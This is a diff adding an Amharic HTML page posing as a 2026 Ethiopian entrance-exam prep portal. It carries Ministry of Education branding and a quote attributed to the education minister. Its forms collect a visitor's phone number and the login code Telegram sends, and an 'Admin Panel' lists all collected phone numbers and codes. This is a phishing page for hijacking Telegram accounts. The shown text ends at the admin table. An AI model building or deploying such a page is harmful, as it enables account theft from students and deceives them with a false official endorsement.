@@ -1,0 +1,705 @@
+
+<!DOCTYPE html>
+<html lang="am" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>የ2018 (2026) የኢንትራንስ ዝግጅት ማዕከል</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Ethiopic:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Noto Sans Ethiopic', sans-serif;
+        }
+    </style>
+</head>
+<body class="bg-slate-900 text-slate-100 min-h-screen flex flex-col justify-between overflow-x-hidden">
+
+    <!-- Top Navigation Bar -->
+    <header class="bg-slate-800 border-b border-slate-700 sticky top-0 z-50 shadow-md">
+        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
+            <div class="flex items-center space-x-3">
+                <div class="bg-blue-600 text-white p-2 rounded-lg font-bold text-xl tracking-wider">
+                    E26
+                </div>
+                <div>
+                    <h1 class="text-sm md:text-lg font-bold text-white leading-tight">የኢንትራንስ ዝግጅት ማዕከል</h1>
+                    <p class="text-xs text-blue-400">የ2018 (2026) የፈተና መረጃና ማለማመጃ</p>
+                </div>
+            </div>
+            <div class="flex items-center space-x-2">
+                <button onclick="switchView('admin-login')" class="text-xs bg-slate-700 hover:bg-slate-600 text-slate-300 hover:text-white px-3 py-1.5 rounded-lg border border-slate-600 transition-colors">
+                    አድሚን ገጽ (Admin)
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Notification Toast Container (No Alerts Allowed) -->
+    <div id="toast-container" class="fixed top-5 right-5 z-50 pointer-events-none flex flex-col gap-2 max-w-sm w-full px-4"></div>
+
+    <!-- Main Content Area -->
+    <main class="flex-grow container mx-auto px-4 py-8 max-w-5xl">
+
+        <!-- STEP 1: Phone Submission View -->
+        <section id="view-step-1" class="space-y-8 animate-fade-in">
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+                
+                <!-- Entrance Information Section (Left) -->
+                <div class="lg:col-span-7 space-y-6">
+                    <div class="bg-gradient-to-r from-blue-900/40 to-indigo-900/40 p-6 rounded-2xl border border-blue-500/30">
+                        <span class="bg-blue-500/20 text-blue-300 text-xs font-semibold px-3 py-1 rounded-full uppercase tracking-wider">አዲስ መረጃ</span>
+                        <h2 class="text-2xl md:text-3xl font-extrabold text-white mt-3">የ2018 (2026) የዩኒቨርሲቲ መግቢያ ፈተና መረጃዎች</h2>
+                        <p class="text-slate-300 mt-2 leading-relaxed text-sm md:text-base">
+                            የዘንድሮው የ12ኛ ክፍል ማጠቃለያ ብሔራዊ ፈተና በተመለከተ ከትምህርት ሚኒስቴር የወጡ የቅርብ ጊዜ መረጃዎች፣ የፈተና አሰጣጥ ሂደቶች እና የመቁረጫ ነጥብ ግምቶች እዚህ ይገኛሉ።
+                        </p>
+                    </div>
+
+                    <div class="space-y-4">
+                        <h3 class="text-lg font-semibold text-blue-400 border-b border-slate-800 pb-2">ቁልፍ መረጃዎች</h3>
+                        
+                        <div class="bg-slate-800/50 p-4 rounded-xl border border-slate-700/50 flex gap-4 items-start">
+                            <div class="bg-blue-600/20 text-blue-400 p-2 rounded-lg">
+                                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                            </div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">የፈተና ጊዜ</h4>
+                                <p class="text-xs text-slate-400 mt-1">እንደ ትምህርት ሚኒስቴር እቅድ የዘንድሮው ፈተና በኦንላይን እና በወረቀት ለመስጠት ቅድመ ዝግጅቶች እየተጠናቀቁ ይገኛሉ።</p>
+                            </div>
+                        </div>
+
+                        <div class="bg-slate-800/50 p-4 rounded-xl border border-slate-700/50 flex gap-4 items-start">
+                            <div class="bg-indigo-600/20 text-indigo-400 p-2 rounded-lg">
+                                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253"></path></svg>
+                            </div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">የፈተና ይዘትና ዝግጅት</h4>
+                                <p class="text-xs text-slate-400 mt-1">ፈተናው በዋናነት ከአዲሱ ካሪኩለም (New Curriculum) የተመረጡ ርዕሰ ጉዳዮችን መሰረት አድርጎ የሚዘጋጅ ይሆናል።</p>
+                            </div>
+                        </div>
+
+                        <div class="bg-slate-800/50 p-4 rounded-xl border border-slate-700/50 flex gap-4 items-start">
+                            <div class="bg-emerald-600/20 text-emerald-400 p-2 rounded-lg">
+                                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                            </div>
+                            <div>
+                                <h4 class="font-bold text-white text-sm">የፈተና መለማመጃዎች</h4>
+                                <p class="text-xs text-slate-400 mt-1">ለመመዝገብ ስልክ ቁጥርዎን በማስገባት በቴሌግራም የሚላክልዎትን ማረጋገጫ ኮድ በመጠቀም ነፃ የፈተና መለማመጃዎችን ያግኙ።</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Registration Form Container (Right) -->
+                <div class="lg:col-span-5 bg-slate-800 border border-slate-700 rounded-2xl p-6 shadow-xl space-y-6">
+                    <div class="text-center space-y-2">
+                        <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/10 text-blue-400 mb-2">
+                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                        </div>
+                        <h3 class="text-xl font-bold text-white">ለመጀመር ይመዝገቡ</h3>
+                        <p class="text-xs text-slate-400">ፈተናዎችንና መረጃዎችን ለማግኘት ስልክ ቁጥርዎን ያስገቡ</p>
+                    </div>
+
+                    <form id="form-phone" onsubmit="handlePhoneSubmit(event)" class="space-y-4">
+                        <div>
+                            <label for="phone-input" class="block text-xs font-semibold text-slate-300 mb-2">የስልክ ቁጥር</label>
+                            <div class="relative">
+                                <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-slate-500">
+                                    +251
+                                </div>
+                                <input type="tel" id="phone-input" required placeholder="912345678" pattern="[79][0-9]{8}" title="እባክዎ ትክክለኛ የኢትዮጵያ ስልክ ቁጥር ያስገቡ (ለምሳሌ፦ 912345678)" class="w-full pl-16 pr-4 py-3 bg-slate-900 border border-slate-700 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-white placeholder-slate-600 transition-all">
+                            </div>
+                            <p class="text-[10px] text-slate-500 mt-1.5">ያለ 0 (ለምሳሌ፦ 9xxxxxxxx ወይም 7xxxxxxxx)</p>
+                        </div>
+
+                        <button type="submit" class="w-full py-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl shadow-lg hover:shadow-blue-500/20 active:scale-[0.98] transition-all flex items-center justify-center space-x-2">
+                            <span>ይቀጥሉ</span>
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                        </button>
+                    </form>
+
+                    <div class="bg-slate-900/50 p-4 rounded-xl border border-slate-700/60 text-xs space-y-2">
+                        <div class="flex items-center text-slate-300 gap-1.5 font-semibold">
+                            <svg class="w-4 h-4 text-emerald-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M6.267 3.455a.75.75 0 00-.708-.523H4.5a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h1.059a.75.75 0 00.707-.523l.115-.345h2.248l.115.345a.75.75 0 00.707.523H10.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75H9.44a.75.75 0 00-.707.523l-.115.345H6.382l-.115-.345zM4.5 12.5a.75.75 0 01.75-.75h1.059a.75.75 0 01.707.523l.115.345h2.248l.115-.345a.75.75 0 01.707-.523H10.5a.75.75 0 01.75.75v3a.75.75 0 01-.75.75H9.441a.75.75 0 01-.707-.523l-.115-.345H6.382l-.115.345a.75.75 0 01-.707.523H4.5a.75.75 0 01-.75-.75v-3z" clip-rule="evenodd"></path></svg>
+                            ደህንነትና ምስጢራዊነት
+                        </div>
+                        <p class="text-slate-400 leading-relaxed">
+                            የእርስዎ ስልክ ቁጥር ለፈተና ዝግጅት መለያነትና የማረጋገጫ ኮድ ለመላክ ብቻ ጥቅም ላይ ይውላል። ለሌላ ወገን አሳልፎ አይሰጥም።
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+
+        <!-- STEP 2: Verification Code View -->
+        <section id="view-step-2" class="hidden space-y-8 animate-fade-in">
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+                
+                <!-- Minister Profile & Info Section (Left) -->
+                <div class="lg:col-span-7 space-y-6">
+                    <div class="bg-slate-800 border border-slate-700 rounded-2xl p-6 shadow-lg">
+                        <div class="flex flex-col sm:flex-row items-center gap-6">
+                            <!-- Stylized Professor Berhanu Nega SVG Avatar -->
+                            <div class="flex-shrink-0">
+                                <div class="w-32 h-32 rounded-2xl bg-gradient-to-tr from-blue-700 to-indigo-900 border-2 border-blue-400 shadow-inner flex flex-col items-center justify-end overflow-hidden relative">
+                                    <!-- Background Stylized details -->
+                                    <div class="absolute top-2 right-2 w-4 h-4 rounded-full bg-yellow-400 opacity-20"></div>
+                                    <div class="absolute top-8 left-3 w-6 h-6 rounded-full bg-blue-300 opacity-10"></div>
+                                    
+                                    <!-- Stylized Portrait representation using SVGs/CSS -->
+                                    <svg viewBox="0 0 100 100" class="w-28 h-28 z-10">
+                                        <!-- Hair & Suit -->
+                                        <path d="M20,90 Q50,45 80,90" fill="#1e293b" />
+                                        <!-- Shirt -->
+                                        <path d="M40,90 L50,75 L60,90 Z" fill="#ffffff" />
+                                        <path d="M48,90 L50,82 L52,90 Z" fill="#b91c1c" /> <!-- Red Tie -->
+                                        <!-- Face / Head -->
+                                        <ellipse cx="50" cy="45" rx="20" ry="24" fill="#8d5b4c" />
+                                        <!-- Glasses -->
+                                        <rect x="36" y="38" width="12" height="8" rx="2" fill="none" stroke="#f1f5f9" stroke-width="2"/>
+                                        <rect x="52" y="38" width="12" height="8" rx="2" fill="none" stroke="#f1f5f9" stroke-width="2"/>
+                                        <line x1="48" y1="42" x2="52" y2="42" stroke="#f1f5f9" stroke-width="2"/>
+                                        <!-- Hair/Forehead -->
+                                        <path d="M30,30 Q50,20 70,30 Q50,28 30,30" fill="#475569" stroke="#cbd5e1" stroke-width="1"/>
+                                        <!-- Mustache -->
+                                        <path d="M42,54 Q50,50 58,54" stroke="#334155" stroke-width="3" fill="none"/>
+                                        <!-- Eyes -->
+                                        <circle cx="42" cy="42" r="1.5" fill="#0f172a" />
+                                        <circle cx="58" cy="42" r="1.5" fill="#0f172a" />
+                                    </svg>
+                                </div>
+                                <p class="text-center text-[10px] text-slate-400 mt-2 font-semibold">ፕሮፌሰር ብርሃኑ ነጋ</p>
+                            </div>
+
+                            <div class="space-y-3 flex-1 text-center sm:text-left">
+                                <span class="bg-amber-500/20 text-amber-400 text-xs font-semibold px-2.5 py-1 rounded-full">የትምህርት ሚኒስቴር መግለጫ</span>
+                                <h3 class="text-xl font-extrabold text-white">የትምህርት ጥራትና የፈተና ጥበቃ</h3>
+                                <p class="text-slate-300 text-xs md:text-sm leading-relaxed">
+                                    "የኢንትራንስ ፈተና የሀገሪቱን የትምህርት ጥራት ለመለካት ዋነኛው መሣሪያ ነው። ተማሪዎች በራሳቸው ጥረትና በቂ ዝግጅት አድርገው ፈተናውን እንዲያልፉ ምኞቴ ነው፤ ለዚህም አስፈላጊውን ዝግጅት በቴክኖሎጂ ታግዘን አጠናቀናል።"
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-slate-800/40 border border-slate-700/60 rounded-2xl p-5 space-y-4">
+                        <h4 class="font-bold text-white text-sm border-b border-slate-700 pb-2 flex items-center gap-2">
+                            <span class="w-2.5 h-2.5 rounded-full bg-blue-500"></span>
+                            የትምህርት ሚኒስቴር ዋና ዋና መመሪያዎች (በአማርኛ)
+                        </h4>
+                        <ul class="space-y-3 text-xs md:text-sm text-slate-300">
+                            <li class="flex items-start gap-2">
+                                <span class="text-blue-400 font-bold">1.</span>
+                                <span><strong>የኦንላይን ምዝገባ፡</strong> እያንዳንዱ ተማሪ በየትምህርት ቤቱ በኩል ትክክለኛ መረጃው መግባቱን ማረጋገጥ አለበት።</span>
+                            </li>
+                            <li class="flex items-start gap-2">
+                                <span class="text-blue-400 font-bold">2.</span>
+                                <span><strong>የፈተና ወሰን፡</strong> ፈተናው የሚዘጋጀው በብሔራዊ ካሪኩለም በተቀመጡት ዋና ዋና የትምህርት ይዘቶች ላይ ብቻ ነው።</span>
+                            </li>
+                            <li class="flex items-start gap-2">
+                                <span class="text-blue-400 font-bold">3.</span>
+                                <span><strong>አስገዳጅ ህጎች፡</strong> በፈተና ወቅት ማንኛውንም አይነት የኤሌክትሮኒክስ እቃ መያዝ በጥብቅ የተከለከለ ነው።</span>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Verification Form Container (Right) -->
+                <div class="lg:col-span-5 bg-slate-800 border border-slate-700 rounded-2xl p-6 shadow-xl space-y-6">
+                    <div class="text-center space-y-2">
+                        <!-- Telegram Icon -->
+                        <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-blue-500/10 text-blue-400 mb-2">
+                            <svg class="w-6 h-6 text-sky-400" fill="currentColor" viewBox="0 0 24 24">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15.15-.31.33-.48.51-1.39 1.45-3.8 3.96-4.59 4.79-.27.28-.55.33-.74.33-.29 0-.58-.1-.77-.28-.15-.14-.28-.36-.34-.63l-.86-2.82c-.22-.72.06-1.08.35-1.08.2 0 .42.13.56.27l1.04.88c.11.1.28.1.39-.01l3.52-3.48c.11-.11.27-.14.39-.04.14.12.18.3.08.43z"/>
+                            </svg>
+                        </div>
+                        <h3 class="text-xl font-bold text-white">ማረጋገጫ ኮድ</h3>
+                        <p class="text-xs text-amber-400">ቴሌግራም ላይ የገባውን code ያስገቡ</p>
+                    </div>
+
+                    <div class="p-3 bg-blue-950/40 border border-blue-900 rounded-xl text-center text-xs text-blue-300">
+                        የተመዘገበው ስልክ፡ <span id="display-phone-number" class="font-bold text-white"></span>
+                    </div>
+
+                    <form id="form-code" onsubmit="handleCodeSubmit(event)" class="space-y-4">
+                        <div>
+                            <label for="code-input" class="block text-xs font-semibold text-slate-300 mb-2">የቴሌግራም ማረጋገጫ ኮድ</label>
+                            <input type="text" id="code-input" required placeholder="ለምሳሌ፦ 5482" class="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-white placeholder-slate-600 text-center font-mono text-lg tracking-widest transition-all">
+                        </div>
+
+                        <button type="submit" class="w-full py-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl shadow-lg hover:shadow-blue-500/20 active:scale-[0.98] transition-all flex items-center justify-center space-x-2">
+                            <span>አረጋግጥና አስገባ</span>
+                        </button>
+                    </form>
+
+                    <div class="flex justify-between items-center text-xs text-slate-400">
+                        <button onclick="switchView('step-1')" class="hover:text-white flex items-center gap-1 transition-colors">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
+                            ስልክ ቁጥር ለመቀየር
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+
+        <!-- STEP 3: Full Entrance Prep & Success Dashboard -->
+        <section id="view-success" class="hidden space-y-8 animate-fade-in">
+            <!-- Alert Banner -->
+            <div class="bg-emerald-950/40 border border-emerald-500/30 p-4 rounded-2xl flex items-center gap-3">
+                <div class="bg-emerald-500/20 text-emerald-400 p-2 rounded-xl">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                </div>
+                <div>
+                    <h4 class="font-bold text-white text-sm md:text-base">ምዝገባዎ በተሳካ ሁኔታ ተጠናቋል!</h4>
+                    <p class="text-xs text-slate-400">አሁን ሁሉንም የኢንትራንስ መረጃዎች እና የፈተና መለማመጃዎችን በነጻ መጠቀም ይችላሉ።</p>
+                </div>
+            </div>
+
+            <!-- Dashboard Content Layout -->
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
+                <!-- Main Study Desk (Left 8 Cols) -->
+                <div class="lg:col-span-8 space-y-6">
+                    
+                    <!-- Beautiful simulated Exam photo section using styling -->
+                    <div class="relative bg-slate-800 rounded-2xl border border-slate-700 overflow-hidden shadow-lg h-56 flex items-center justify-center">
+                        <!-- Custom CSS/SVG Exam Illustration -->
+                        <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-slate-900/60 to-transparent z-10"></div>
+                        <div class="absolute inset-0 opacity-10 bg-[radial-gradient(#38bdf8_1px,transparent_1px)] [background-size:16px_16px]"></div>
+                        
+                        <div class="z-20 text-center px-4 space-y-2">
+                            <span class="bg-blue-600 text-white text-[10px] font-bold px-3 py-1 rounded-full uppercase tracking-wider">ብሔራዊ ፈተና 2018</span>
+                            <h3 class="text-xl md:text-3xl font-black text-white">ልፋት የለሽ የፈተና ዝግጅት ማዕከል</h3>
+                            <p class="text-xs md:text-sm text-slate-300">በራስ የመተማመን ስሜትን የሚያሳድጉ የጥያቄ ማውጫዎች</p>
+                        </div>
+                        
+                        <!-- Decorative floating elements mimicking test papers -->
+                        <div class="absolute top-6 left-12 w-20 h-28 bg-slate-700/40 rounded-lg transform -rotate-12 border border-slate-600/50 p-2 text-[6px] text-slate-500 space-y-1">
+                            <div class="w-8 h-1.5 bg-blue-500 rounded"></div>
+                            <div class="w-12 h-1 bg-slate-600 rounded"></div>
+                            <div class="w-10 h-1 bg-slate-600 rounded"></div>
+                        </div>
+                        <div class="absolute bottom-6 right-12 w-20 h-28 bg-slate-700/40 rounded-lg transform rotate-12 border border-slate-600/50 p-2 text-[6px] text-slate-500 space-y-1">
+                            <div class="w-8 h-1.5 bg-emerald-500 rounded"></div>
+                            <div class="w-12 h-1 bg-slate-600 rounded"></div>
+                            <div class="w-10 h-1 bg-slate-600 rounded"></div>
+                        </div>
+                    </div>
+
+                    <!-- Exam Practice Module tabs/sections -->
+                    <div class="space-y-4">
+                        <h3 class="text-lg font-bold text-white flex items-center gap-2">
+                            <span class="w-1.5 h-6 bg-blue-500 rounded-full"></span>
+                            የኢንትራንስ ጥያቄዎች ማለማመጃ ክፍሎች (Practice Exams)
+                        </h3>
+
+                        <!-- Practice Cards Grid -->
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <!-- Natural Sciences -->
+                            <div class="bg-slate-800 border border-slate-700 hover:border-slate-600 p-5 rounded-2xl transition-all space-y-4">
+                                <div class="flex justify-between items-start">
+                                    <div class="bg-blue-500/10 text-blue-400 p-3 rounded-xl">
+                                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z"></path></svg>
+                                    </div>
+                                    <span class="text-xs bg-blue-500/20 text-blue-300 font-semibold px-2 py-1 rounded-lg">ተፈጥሮ ሳይንስ</span>
+                                </div>
+                                <div>
+                                    <h4 class="font-bold text-white">Natural Science Stream</h4>
+                                    <p class="text-xs text-slate-400 mt-1">Physics, Chemistry, Biology, Mathematics & English</p>
+                                </div>
+                                <button onclick="startPractice('Natural Science')" class="w-full py-2 bg-slate-700 hover:bg-slate-600 text-white text-xs font-semibold rounded-lg transition-colors">
+                                    መለማመጃ ጀምር
+                                </button>
+                            </div>
+
+                            <!-- Social Sciences -->
+                            <div class="bg-slate-800 border border-slate-700 hover:border-slate-600 p-5 rounded-2xl transition-all space-y-4">
+                                <div class="flex justify-between items-start">
+                                    <div class="bg-emerald-500/10 text-emerald-400 p-3 rounded-xl">
+                                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253"></path></svg>
+                                    </div>
+                                    <span class="text-xs bg-emerald-500/20 text-emerald-300 font-semibold px-2 py-1 rounded-lg">ማህበራዊ ሳይንስ</span>
+                                </div>
+                                <div>
+                                    <h4 class="font-bold text-white">Social Science Stream</h4>
+                                    <p class="text-xs text-slate-400 mt-1">Geography, History, Economics, Mathematics & English</p>
+                                </div>
+                                <button onclick="startPractice('Social Science')" class="w-full py-2 bg-slate-700 hover:bg-slate-600 text-white text-xs font-semibold rounded-lg transition-colors">
+                                    መለማመጃ ጀምር
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Info Desk Side (Right 4 Cols) -->
+                <div class="lg:col-span-4 space-y-6">
+                    <div class="bg-slate-800 border border-slate-700 rounded-2xl p-5 space-y-4">
+                        <h4 class="font-bold text-white text-sm border-b border-slate-700 pb-2">ጠቃሚ የፈተና ምክሮች</h4>
+                        
+                        <div class="space-y-3">
+                            <div class="p-3 bg-slate-900 rounded-xl space-y-1">
+                                <span class="text-xs font-bold text-blue-400">1. የጊዜ አጠቃቀም</span>
+                                <p class="text-xs text-slate-400 leading-relaxed">በእያንዳንዱ ጥያቄ ላይ ከ1-2 ደቂቃ በላይ ባለማጥፋት ሰዓትዎን በአግባቡ ይቆጥቡ።</p>
+                            </div>
+
+                            <div class="p-3 bg-slate-900 rounded-xl space-y-1">
+                                <span class="text-xs font-bold text-amber-400">2. ከአስቸጋሪ ጥያቄዎች መቆጠብ</span>
+                                <p class="text-xs text-slate-400 leading-relaxed">ከባድ ጥያቄዎችን አልፈው ቀላል ጥያቄዎችን ቀድመው በመመለስ በራስ መተማመንዎን ይገንቡ።</p>
+                            </div>
+
+                            <div class="p-3 bg-slate-900 rounded-xl space-y-1">
+                                <span class="text-xs font-bold text-emerald-400">3. የማስወገድ ዘዴ (Elimination)</span>
+                                <p class="text-xs text-slate-400 leading-relaxed">መልስ ሊሆኑ የማይችሉ አማራጮችን በፍጥነት በመቀነስ ወደ ትክክለኛው መልስ ይጠጉ።</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Mini Exam Prep Mock Window (Interactive Component) -->
+                    <div id="quick-mock" class="bg-slate-800 border border-slate-700 rounded-2xl p-5 space-y-4">
+                        <h4 class="font-bold text-white text-sm border-b border-slate-700 pb-2">የዕለቱ የሙከራ ጥያቄ</h4>
+                        <div id="mock-question-container" class="space-y-3">
+                            <p class="text-xs text-slate-300 leading-relaxed font-semibold">
+                                ጥያቄ፡ የ2018 የኢትዮጵያ ዩኒቨርሲቲ መግቢያ ፈተና (Entrance Exam) የሚዘጋጀው በየትኛው የትምህርት ካሪኩለም ላይ ተመስርቶ ነው?
+                            </p>
+                            <div class="space-y-2 text-xs">
+                                <button onclick="answerMock(true)" class="w-full text-left p-2.5 rounded-lg bg-slate-900 hover:bg-slate-700 border border-slate-700 text-slate-300 transition-colors">
+                                    ሀ) በአዲሱ ብሔራዊ ካሪኩለም (New Curriculum)
+                                </button>
+                                <button onclick="answerMock(false)" class="w-full text-left p-2.5 rounded-lg bg-slate-900 hover:bg-slate-700 border border-slate-700 text-slate-300 transition-colors">
+                                    ለ) በአሮጌው ካሪኩለም (Old Curriculum)
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+
+        <!-- ADMIN: Login View -->
+        <section id="view-admin-login" class="hidden max-w-md mx-auto space-y-6 py-12 animate-fade-in">
+            <div class="bg-slate-800 border border-slate-700 rounded-2xl p-6 shadow-xl space-y-6">
+                <div class="text-center space-y-2">
+                    <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-slate-700 text-slate-300 mb-2">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                    </div>
+                    <h3 class="text-xl font-bold text-white">አድሚን መግቢያ</h3>
+                    <p class="text-xs text-slate-400">ወደ መረጃ መቀበያ ሰሌዳ ለመግባት ምስጢራዊ ቁልፍ ያስገቡ</p>
+                </div>
+
+                <form id="form-admin-login" onsubmit="handleAdminLogin(event)" class="space-y-4">
+                    <div>
+                        <label for="admin-user" class="block text-xs font-semibold text-slate-300 mb-1.5">User name</label>
+                        <input type="text" id="admin-user" required placeholder="User name ያስገቡ" class="w-full px-4 py-2.5 bg-slate-900 border border-slate-700 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-white placeholder-slate-600 text-sm transition-all">
+                    </div>
+
+                    <div>
+                        <label for="admin-password" class="block text-xs font-semibold text-slate-300 mb-1.5">Password</label>
+                        <input type="password" id="admin-password" required placeholder="Password ያስገቡ" class="w-full px-4 py-2.5 bg-slate-900 border border-slate-700 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-white placeholder-slate-600 text-sm transition-all">
+                    </div>
+
+                    <button type="submit" class="w-full py-2.5 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl shadow-lg transition-colors text-sm">
+                        ግባ
+                    </button>
+                </form>
+
+                <button onclick="switchView('step-1')" class="w-full text-center text-xs text-slate-400 hover:text-white transition-colors">
+                    ወደ ዋናው ገጽ ይመለሱ
+                </button>
+            </div>
+        </section>
+
+
+        <!-- ADMIN: Dashboard View -->
+        <section id="view-admin-dashboard" class="hidden space-y-6 animate-fade-in">
+            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 bg-slate-800 border border-slate-700 p-5 rounded-2xl">
+                <div>
+                    <h2 class="text-xl font-extrabold text-white flex items-center gap-2">
+                        <span class="w-3 h-3 rounded-full bg-emerald-500 animate-pulse"></span>
+                        የመረጃ መቀበያ ሰሌዳ (Admin Panel)
+                    </h2>
+                    <p class="text-xs text-slate-400">እስካሁን የተመዘገቡ ተጠቃሚዎች ስልክ እና የቴሌግራም ኮድ ዝርዝር</p>
+                </div>
+                <div class="flex gap-2">
+                    <button onclick="clearAdminData()" class="text-xs bg-red-950/40 hover:bg-red-900/60 text-red-400 px-3 py-2 rounded-xl border border-red-900/50 transition-colors">
+                        ሁሉንም አጥፋ
+                    </button>
+                    <button onclick="logoutAdmin()" class="text-xs bg-slate-700 hover:bg-slate-600 text-white px-3 py-2 rounded-xl border border-slate-600 transition-colors">
+                        ውጣ
+                    </button>
+                </div>
+            </div>
+
+            <!-- Stats Bar -->
+            <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+                <div class="bg-slate-800 border border-slate-700 p-4 rounded-xl flex items-center justify-between">
+                    <div>
+                        <span class="text-xs text-slate-400">አጠቃላይ ምዝገባዎች</span>
+                        <h3 id="stat-total-users" class="text-2xl font-bold text-white mt-1">0</h3>
+                    </div>
+                    <div class="bg-blue-500/10 text-blue-400 p-2.5 rounded-lg">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Registered Users Table -->
